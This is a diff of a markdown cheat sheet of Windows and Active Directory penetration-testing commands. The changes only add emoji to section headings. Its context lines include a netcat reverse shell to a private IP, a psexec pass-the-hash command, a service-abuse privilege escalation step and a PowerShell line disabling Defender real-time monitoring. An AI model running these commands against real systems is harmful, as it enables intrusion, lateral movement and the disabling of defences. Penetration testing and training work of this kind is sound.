@@ -17,7 +17,7 @@ Any **useful commands** for **Windows** / **Active Directory** will be posted he
 
 &nbsp;
 
-## Reverse shells
+## :hook: Reverse shells
 
 &nbsp;
 &nbsp;
@@ -53,7 +53,7 @@ nc.exe 192.168.13.37 443 -e cmd.exe
 &nbsp;
 &nbsp;
 
-## Transfer files
+## :open_file_folder: Transfer files
 
 &nbsp;
 &nbsp;
@@ -93,7 +93,7 @@ Note: You can access the share \\tsclient directly too
 &nbsp;
 &nbsp;
 
-## Privilege escalation
+## :test_tube: Privilege escalation
 
 &nbsp;
 &nbsp;
@@ -159,7 +159,7 @@ C:\Users\victim\Desktop>sc start SNMPTRAP
 &nbsp;
 &nbsp;
 
-## Kerberos - Tickets
+## :label: Kerberos - Tickets
 
 &nbsp;
 &nbsp;
@@ -204,7 +204,7 @@ Invoke-Command -ComputerName UFC-JUMPSRV -Credential $cred -ScriptBlock {
 &nbsp;
 &nbsp;
 
-## Pass the hash
+## :joystick: Pass the hash
 
 &nbsp;
 &nbsp;
@@ -235,7 +235,7 @@ python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b5140
 &nbsp;
 &nbsp;
 
-## Enumeration - Recon
+## :mag: Enumeration - Recon
 
 &nbsp;
 &nbsp;
@@ -273,7 +273,7 @@ Invoke-ACLScanner -ResolveGUID | ? {$_.IdentityReferenceName -like "*jumpsrv*"}
 &nbsp;
 &nbsp;
 
-## Bypass security - AV evasion
+## :unlock: Bypass security - AV evasion
 
 &nbsp;
 &nbsp;
@@ -308,7 +308,7 @@ powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
 &nbsp;
 &nbsp;
 
-## Misc commands
+## :zap: Misc commands
 
 &nbsp;
 &nbsp;
